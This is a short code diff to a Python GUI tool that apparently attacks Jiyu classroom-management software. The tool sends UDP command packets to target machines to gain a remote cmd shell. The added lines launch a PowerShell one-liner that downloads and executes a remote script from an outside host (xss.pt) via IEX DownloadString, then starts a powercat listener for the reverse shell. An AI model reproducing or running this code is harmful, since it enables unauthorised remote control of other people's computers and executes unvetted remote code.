@@ -446,8 +446,12 @@ class JiyuUdpGUI(QMainWindow):
             pkt = build_packet('-c', cmd)
             send_packets([target], self.port.value(), [pkt])
             dlg.append_log(f"[+] 已发送 payload 到 {target}")
-            dlg.append_log(f"[*] 请在本地监听: {local_ip}:{num}")
-            dlg.append_log(f"[*] 或手动执行: powercat -l -p {num}")
+            dlg.append_log(f"[*] 正在本地监听 {local_ip}:{num} ...")
+            dlg.append_log(f"[*] 目标连接后即可获得 cmd shell，输入 exit 退出")
+            # 启动本地 powercat 监听（与原版一致）
+            listen_cmd = f"powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {num}"
+            popen(listen_cmd)
+            dlg.append_log(f"[!] 监听已启动，等待目标连接...")
         except Exception as e:
             dlg.append_log(f"[-] Shell 错误: {e}")
 
